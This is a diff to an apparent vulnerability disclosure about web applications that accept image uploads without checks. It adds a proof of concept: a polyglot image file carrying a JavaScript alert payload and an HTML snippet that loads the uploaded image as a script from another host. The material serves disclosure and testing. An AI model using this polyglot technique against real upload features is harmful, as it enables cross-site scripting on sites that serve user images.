@@ -12,7 +12,16 @@ Consider a web application which allows users to upload image files but does not
 
 ## Step by Step Proof of Concept
 
-I used a polyglot GIF with a built-in JavaScript code (available at:), and the following HTML / JS code:
+I used a polyglot GIF with a built-in JavaScript code (available at: http://portswigger-labs.net/polyglot/jpeg/xss_within_header_compressed_small_logo.jpg):
+
+ */=alert("Burp rocks.")/*
+
+And the following HTML / JS code:
+
+ <html>
+     <img src="2x.jpg">
+	   <script src="https://poc.sejalivre.org/wp-content/uploads/2019/12/2x.jpg"></script>
+ </html>
 
 I hosted at http://joomla.sejalivre.org
 
